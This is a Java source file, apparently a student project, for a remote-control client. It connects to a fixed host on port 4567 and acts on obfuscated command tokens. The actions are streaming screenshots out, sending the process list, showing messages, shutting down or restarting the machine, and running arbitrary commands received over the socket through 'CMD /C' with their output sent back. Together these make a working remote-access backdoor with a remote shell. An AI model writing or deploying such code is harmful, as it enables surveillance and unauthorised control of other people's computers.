
import java.awt.AWTException;
import java.awt.List;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Scanner;
import javax.imageio.ImageIO;
import javax.swing.JOptionPane;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Lenovo
 */
public class Client {
    //HASH CODE
    private static final String SCREENSHOT = "lhju2vru2hikv3rhj23ig2ur792yriu24jhvcujy";
    private static final String SHUTDOWN =  "bhwuegcjae79rig379y9f87cc7sd9sd67dsjs843";
    private static final String PROCCESSVIEW = "bsd7ojhi3t6ged7dc6dffi32jvhji89jmvjhyufd";
    private static final String MESSAGE = "bsklshcu9e2vjbhil4fhjvjhc2ukjciuu5yjcj3r";
    private static final String REMOTEDESKTOPACCESS = "ooibv456789ugub987653awdxhoi6546ugci5yuu";
    private static final String RESTART = "w3456789ojhgfdswe46789okjfdswer67uijhcxs";             
    
   
    static Socket clientSocket;
    static OutputStream out;
    static InputStream in;
    static String fileName;
    static PrintWriter pw;
    static String str;
    static Runtime runtime;
    static Process process;
    
    public Client (){
        try {
        InetAddress ia = InetAddress.getByName("utkarshchidar");
        clientSocket = new Socket(ia,4567);
        System.out.println("Success!!");
       
        
        }catch(IOException ex) {
            JOptionPane.showMessageDialog(null, "Problem with io" + ex);
        }   
    }
    
    public static void main(String[] args) {
        // TODO code application logic here
        
        //thread ki coding 
        
        try {
        Client c = new Client();
        InputStream ips = null;
        Scanner obj = new Scanner(clientSocket.getInputStream());
        
        str = obj.nextLine();
        System.out.println(str);
        
       
   
        int ch = 0;
        if(str.equals(SCREENSHOT))
            ch = 1;
        else if(str.equals(PROCCESSVIEW))
            ch =2;
        else if(str.equals(MESSAGE))
            ch = 3;
        else if(str.equals(SHUTDOWN))
            ch = 4;
        else if(str.equals(RESTART))
            ch = 5;
        else if(str.equals(REMOTEDESKTOPACCESS))
            ch = 6;
        
        
        
        
switch (ch) {

case 1:
    try {
    SimpleDateFormat formatter=new SimpleDateFormat("yyyy-MM-dd,hh_mm _ss a");
    Date date=new Date();
    Robot robot = new Robot();            
    String format = "jpg";
    String today= formatter.format(date);
    pw = new PrintWriter(clientSocket.getOutputStream());
           
    fileName =today+"."+format;
           
             
    Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
    BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
    ImageIO.write(screenFullImage, "jpg", clientSocket.getOutputStream());
    pw.flush();
    //ImageIO.write(screenFullImage, format, new File("I:\\screenshot\\"+fileName));
    JOptionPane.showMessageDialog(null, "screenshot taken and saved to I:\\screenshot\\fileName","succcess",JOptionPane.INFORMATION_MESSAGE);
    System.out.println("A full screenshot saved!" +today);
    } 
    catch (AWTException | IOException ex) {
    System.err.println(ex);
    }
   /* BufferedInputStream fileIn = null;
     BufferedOutputStream bout = null;
     File file = new File("G:\\screenshot");
      if (!file.exists()) {
       System.out.println("No such file");
     System.exit(0);
     }
     try{
      DataOutputStream dataOutputStream = null;
       out = clientSocket.getOutputStream();
     dataOutputStream = new DataOutputStream(out);
     in = clientSocket.getInputStream();
     BufferedImage image = ImageIO.read(new File(fileName));
     ImageIO.write(image, "JPG", clientSocket.getOutputStream());
     System.out.println("Client: Image sent to server");
      }
     catch (IOException e) {
     }*/
    break;
            
    
case 2:
    try {
         process = Runtime.getRuntime().exec("tasklist.exe");
         BufferedReader stdInput = new BufferedReader(new
        InputStreamReader(process.getInputStream()));       // for reading the ouput from stream

        String s ;
        pw = new PrintWriter(clientSocket.getOutputStream());
        while ((s = stdInput.readLine()) != null) {
            System.out.println(s);
            pw.println(s);
            pw.flush();
        }
     } catch (IOException ex) {
            System.out.println("Exception in process view");
     }

    break;
            
case 3:
    try { 
      obj = new Scanner(clientSocket.getInputStream());
      String message = obj.nextLine();
      JOptionPane.showMessageDialog(null,message);
      System.out.println(message);
    } catch(Exception e) {
      System.out.println(e.toString());
      e.printStackTrace();
    }  
    break;

case 4:
      runtime=Runtime.getRuntime();
    try{
      process=runtime.exec("shutdown -s -t 60");
    }catch(Exception ex){
      javax.swing.JOptionPane.showMessageDialog(null, ex.getMessage());
    }
    break; 

case 5:
      runtime=Runtime.getRuntime();
    try{
      process=runtime.exec("shutdown -r -t 60");
    }catch(Exception ex){
      javax.swing.JOptionPane.showMessageDialog(null, ex.getMessage());
    }
    break; 

case 6:
    try { 
      String command;
      obj = new Scanner(clientSocket.getInputStream());
      command= obj.nextLine();
      ArrayList<String> list = new ArrayList<String>();    // creating list of process
      list.add("CMD");
      list.add("/C");
      list.add(command);

      ProcessBuilder build = new ProcessBuilder(list);    // create the process
      System.out.println("command: " + build.command());   // checking the command list

      build.directory(new File("c:\\Windows\\System32"));  //set up work directory
      process = build.start();                    // starting the process
      BufferedReader stdInput = new BufferedReader(new
      InputStreamReader(process.getInputStream()));       // for reading the ouput from stream

      String s = null;
      pw = new PrintWriter(clientSocket.getOutputStream());
      while ((s = stdInput.readLine()) != null) {
      pw.println(s);
      pw.flush();
      }
    }catch(Exception e) {
      System.out.println(e.toString());
      e.printStackTrace();
    }  
    break; 
}

}catch(IOException ex) {
      System.out.println("Problem with IO" + ex);
}
    }   
}
